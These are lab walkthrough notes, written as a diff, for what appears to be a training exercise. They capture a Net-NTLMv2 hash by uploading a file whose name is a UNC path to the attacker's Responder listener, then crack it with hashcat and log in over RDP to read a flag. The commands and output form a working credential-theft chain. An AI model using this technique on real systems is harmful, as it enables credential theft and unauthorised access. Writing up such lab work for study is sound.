@@ -1,3 +1,45 @@
 Questions 2
 Enumerate VM #2 and find a way to obtain a Net-NTLMv2 hash via the web application. Important: Add marketingwk01 to your /etc/hosts file with the corresponding IP address of the machine. After you have obtained the Net-NTLMv2 hash, crack it, and connect to the system to find the flag.
 
+nmap -sS 192.168.190.210
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+8000/tcp open  http-alt
+
+sudo nmap -sV -sC -T4 192.168.190.210 -p8000
+# Nothing much can retrive from the service info
+
+echo 192.168.190.210 marketingwk01 >> /etc/hosts
+
+sudo responder -I tun0
+
+Access to below url
+http://marketingwk01:8000
+
+Upload the some sample file and use Burp to intercept
+POST /upload HTTP/1.1
+Host: marketingwk01:8000
+...
+Content-Disposition: form-data; name="myFile"; filename="\\\\<atk ip>\\secrets.txt"
+
+Content-Type: text/plain
+...
+
+# Responder 
+[SMB] NTLMv2-SSP Client   : 192.168.190.210
+[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
+[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:0a867a68a5c54ecb:BC85E6279FD31BF45BC2DCB6C2FBCB47:01010000000000008092A1F88D98DA0142FFA33099D551FF00000000020008003400500030004F0001001E00570049004E002D004A0032004E005000550034004400430042005800320004003400570049004E002D004A0032004E00500055003400440043004200580032002E003400500030004F002E004C004F00430041004C00030014003400500030004F002E004C004F00430041004C00050014003400500030004F002E004C004F00430041004C00070008008092A1F88D98DA010600040002000000080030003000000000000000000000000020000076C478B936C7D4725FC208512791ACCD67C1354F16D14501448E296DAA62BAB30A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370038000000000000000000
+
+nano sam.hash
+hashcat -m 5600 sam.hash /usr/share/wordlists/rockyou.txt --force
+...
+8000000000000000000:DISISMYPASSWORD
+...
+
+xfreerdp /u:sam /p:DISISMYPASSWORD /v:192.168.190.210 /drive:smbfolder,/home/kali/Desktop
+
+type flag.txt
+OS{65cfdea0ce83293acaa24eb8a86c1bde}
